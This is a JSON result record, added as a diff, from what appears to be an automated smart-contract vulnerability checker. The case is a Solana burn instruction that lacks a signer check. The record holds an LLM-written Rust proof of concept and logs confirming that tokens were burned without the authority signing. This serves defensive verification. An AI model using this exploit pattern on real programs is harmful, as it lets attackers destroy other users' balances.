@@ -1,0 +1,100 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: supply reduzido sem assinatura; balance reduzido sem assinatura",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2417,
+        "completion_tokens": 597,
+        "latency_s": 3.76
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta ledger com dados de 56 bytes contendo supply=1000 no offset 40 e balance=500 no offset 48, dona do programa. O baseline chama burn com amount=100 e a conta ledger como signer, provando que o cenario esta correto e que o debito legitimo ocorre. O ataque chama a mesma instrucao burn com amount=100, mas sem a conta ledger assinar (signer=false), referenciando a conta de outro usuario. O efeito mede que o balance e o supply foram reduzidos sem a assinatura da autoridade, comparando os valores apos o ataque com os valores iniciais.\",\n  \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nledger_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&500u64.to_le_bytes());\\nlet ledger_account = account(&env.program_id, &ledger_data, None);\\n\\nlet mut ix_data = vec![3u8];\\nix_data.extend_from_slice(&100u64.to_le_bytes());\\n\\nlet metas_legit = vec![AccountMeta::new(ledger_key, true)];\\nlet ix_legit = env.raw_ix(&ix_data, metas_legit);\\nlet contas_legit = vec![(ledger_key, ledger_account.clone())];\\nlet r_legit = env.baseline(\\\"burn legitimo com assinatura\\\", &ix_legit, &contas_legit);\\n\\nlet metas_ataque = vec![AccountMeta::new(ledger_key, false)];\\nlet ix_ataque = env.raw_ix(&ix_data, metas_ataque);\\nlet contas_ataque = vec![(ledger_key, ledger_account.clone())];\\nlet r = env.attack(\\\"burn sem assinatura da autoridade\\\", &ix_ataque, &contas_ataque);\\n\\nif r.program_result == ProgramResult::Success {\\n    let dados = after(&r, &ledger_key).data();\\n    let supply_depois = read_u64(dados, 40);\\n    let balance_depois = read_u64(dados, 48);\\n    env.effect(\\\"supply reduzido sem assinatura\\\", supply_depois == 900);\\n    env.effect(\\\"balance reduzido sem assinatura\\\", balance_depois == 400);\\n}\"\n}",
+      "plan": "Preparo uma conta ledger com dados de 56 bytes contendo supply=1000 no offset 40 e balance=500 no offset 48, dona do programa. O baseline chama burn com amount=100 e a conta ledger como signer, provando que o cenario esta correto e que o debito legitimo ocorre. O ataque chama a mesma instrucao burn com amount=100, mas sem a conta ledger assinar (signer=false), referenciando a conta de outro usuario. O efeito mede que o balance e o supply foram reduzidos sem a assinatura da autoridade, comparando os valores apos o ataque com os valores iniciais.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nledger_data[40..48].copy_from_slice(&1000u64.to_le_bytes());\nledger_data[48..56].copy_from_slice(&500u64.to_le_bytes());\nlet ledger_account = account(&env.program_id, &ledger_data, None);\n\nlet mut ix_data = vec![3u8];\nix_data.extend_from_slice(&100u64.to_le_bytes());\n\nlet metas_legit = vec![AccountMeta::new(ledger_key, true)];\nlet ix_legit = env.raw_ix(&ix_data, metas_legit);\nlet contas_legit = vec![(ledger_key, ledger_account.clone())];\nlet r_legit = env.baseline(\"burn legitimo com assinatura\", &ix_legit, &contas_legit);\n\nlet metas_ataque = vec![AccountMeta::new(ledger_key, false)];\nlet ix_ataque = env.raw_ix(&ix_data, metas_ataque);\nlet contas_ataque = vec![(ledger_key, ledger_account.clone())];\nlet r = env.attack(\"burn sem assinatura da autoridade\", &ix_ataque, &contas_ataque);\n\nif r.program_result == ProgramResult::Success {\n    let dados = after(&r, &ledger_key).data();\n    let supply_depois = read_u64(dados, 40);\n    let balance_depois = read_u64(dados, 48);\n    env.effect(\"supply reduzido sem assinatura\", supply_depois == 900);\n    env.effect(\"balance reduzido sem assinatura\", balance_depois == 400);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "burn legitimo com assinatura",
+            "result": "Success",
+            "compute_units": 227,
+            "account_flags": "sw",
+            "ix_head": "0364000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "49dd5063165d3225",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000000000000000000084030000000000009001000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "burn sem assinatura da autoridade",
+            "result": "Success",
+            "compute_units": 227,
+            "account_flags": "-w",
+            "ix_head": "0364000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "49dd5063165d3225",
+                "post": "0000000000000000000000000000000000000000000000000000000000000000000000000000000084030000000000009001000000000000"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "supply reduzido sem assinatura",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "balance reduzido sem assinatura",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 227 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 227 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.9
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: supply reduzido sem assinatura; balance reduzido sem assinatura"
+    }
+  ],
+  "case_id": "SSP-03-P-S2",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "fn burn(accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    let ledger = &accounts[0];\n    let mut data = ledger.try_borrow_mut_data()?;",
+    "explanation": "A instrucao debita saldo (balance) e supply da conta `ledger` sem exigir que qualquer conta tenha assinado a transacao. Nao ha verificacao de `is_signer` em nenhuma conta.",
+    "attack_hypothesis": "Qualquer usuario pode enviar a instrucao burn referenciando a conta ledger de outro usuario (ou qualquer conta) e reduzir seu balance/supply sem possuir a chave correspondente, pois nenhuma assinatura e exigida."
+  }
+}
